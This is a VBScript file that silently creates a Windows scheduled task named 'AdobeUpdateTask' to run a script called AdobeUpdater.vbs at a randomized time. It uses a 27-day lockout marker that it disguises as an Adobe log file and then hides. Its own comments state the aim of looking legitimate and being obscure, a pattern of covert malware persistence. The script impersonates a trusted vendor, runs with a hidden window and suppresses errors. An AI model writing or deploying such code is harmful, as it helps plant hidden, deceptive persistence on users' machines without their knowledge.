On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Renamed to something much more obscure
markerFile = "C:\temp\AAM.log" 
vbsPath = "C:\temp\AdobeUpdater.vbs"

' --- 27-Day Lockout Check ---
If fso.FileExists(markerFile) Then
    Set f = fso.GetFile(markerFile)
    ' If the log was updated less than 27 days ago, exit
    If DateDiff("d", f.DateLastModified, Now) < 27 Then
        WScript.Quit
    End If
End If

' --- Randomization Logic ---
Randomize
' Pick a random day in the next 20 days
randomDayNum = Int(20 * Rnd) + 1
' Pick a random hour between 08:00 and 16:00
randomHour = Int(9 * Rnd) + 8
randomMin = Int(60 * Rnd)
startTime = Right("0" & randomHour, 2) & ":" & Right("0" & randomMin, 2)
targetDate = DateAdd("d", randomDayNum, Date)

' --- Create the One-Time Task ---
cmd = "schtasks /create /tn ""AdobeUpdateTask"" /tr ""wscript.exe " & vbsPath & """ /sc once /st " & startTime & " /sd " & targetDate & " /f"
shell.Run cmd, 0, True

' --- Update Obscure Marker File ---
' We write a generic hex-looking code or timestamp to make it look like a real log
Set f = fso.CreateTextFile(markerFile, True)
f.WriteLine "[INFO] " & Now & " - Session ID: " & Hex(Timer) & " - Status: 0x0"
f.Close

fso.GetFile(markerFile).Attributes = 2